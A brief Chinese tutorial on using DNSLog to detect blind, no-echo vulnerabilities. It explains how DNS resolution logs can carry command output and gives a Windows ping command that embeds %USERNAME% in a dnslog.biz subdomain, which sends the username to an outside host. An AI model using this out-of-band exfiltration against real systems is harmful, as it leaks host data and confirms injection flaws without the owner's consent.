## 简介

DNSLog可以检测无回显的漏洞。

原理是DNS服务器会存储DNS解析日志，如果某个主机向DNS服务器申请DNS解析的请求，就回记录下来这个解析日志。只要在真正对域名前加上一些当前主机会执行的命令，就可以在DNSLog上看到主机执行的命令的结果。

## 用法

进入DNSLog网站，https://dnslog.org/

获得子域名，例如22ecbc5e.dnslog.biz

用当前主机ping子域名，并加上可执行的命令。

```bash
ping %USERNAME%.22ecbc5e.dnslog.biz  //windows可执行的命令
```

然后在网站中刷新log信息，就可以看到%USERNAME%的执行结果